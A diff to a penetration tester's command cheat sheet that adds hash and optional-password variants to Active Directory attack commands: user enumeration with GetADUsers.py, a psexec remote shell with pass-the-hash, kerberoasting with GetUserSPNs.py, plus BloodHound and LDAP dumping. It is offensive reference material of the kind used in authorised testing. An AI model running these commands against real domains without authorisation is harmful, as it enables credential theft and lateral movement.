@@ -44,7 +44,7 @@ wpscan --update
 hashcat --force --stdout -r <path-to-rule> <in-list>
 
 # GetADUsers.py enumerate AD users with and password
-GetADUsers.py -all '<fqdn>/<username>:<password>' -dc-ip <dc-ip-address>
+GetADUsers.py -all '<fqdn>/[<username>:<password>]' -dc-ip <dc-ip-address>
 
 # GetADUsers.py enumerate AD users with hash
 GetADUsers.py -all '<fqdn>/<username>' -dc-ip <dc-ip-address> -hashes '<LMHASH>:<NTHASH>'
@@ -64,8 +64,8 @@ ldapdomaindump -u '<fqdn>\<username>' -p '<password-or-LM:NTLM-hash>' -o <outfol
 # bloodhound-python BloodHound ingestor
 bloodhound-python -u '<username>' -p 'password' -dc <dc-hostname> -d <fqdn> -c ALL [--hashes 'LM:NLTM'] [-ns <name-server-ip-to-use>]
 
-# psexec interactive shell as Administrator
-psexec.py '<fqdn>/<username>:<password>@<target-ip-or-host>' -dc-ip <dc-ip>
+# psexec interactive shell as Administrator with username and password or with hashes
+psexec.py '<fqdn>/<username>[:<password>]@<target-ip-or-host>' [-hashes LMHASH:NTHASH] [-dc-ip <dc-ip>]
 
 # GetUserSPNs.py get user accounts with more than one service principal name (= kerberoastable) and request a TGS for them
 GetUserSPNs.py '<fqdn>/<user>:<password>' -dc-ip <dc-ip> [-request -outputfile <out-file>]
